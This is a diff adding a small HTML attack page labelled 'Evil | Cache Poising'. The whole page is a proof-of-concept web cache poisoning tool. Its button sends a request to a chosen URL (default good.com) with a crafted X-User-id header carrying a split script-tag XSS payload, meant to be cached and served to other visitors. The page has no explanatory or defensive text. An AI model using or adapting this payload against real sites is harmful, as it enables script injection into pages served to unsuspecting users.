@@ -1,0 +1,22 @@
+<html>
+  <head>
+	<title>Evil | Cache Poising</title>
+    <script>
+        function startPoisoning(){
+            // function gotcha() { location=url }
+            var req = new XMLHttpRequest();
+            url = document.getElementById("site_url").value; // beware of mixed content blocking when targeting HTTP sites
+            // req.onload = gotcha;
+            req.open('GET', url, true);
+            req.setRequestHeader("X-User-id", "<script>alert(document.getElementById('data').value)</scr"+"ipt>")
+            req.send();
+        }
+    </script> 
+  </head>
+  <body>
+      <h1>Cache poising page</h1>
+      <input type="text" name="name" id="site_url" value="http://good.com/form.html" />
+	  <button onclick="startPoisoning()" >Start poisoning</button>
+    <a href="http://good.com/form.html">link</a>
+	</body>
+</html>
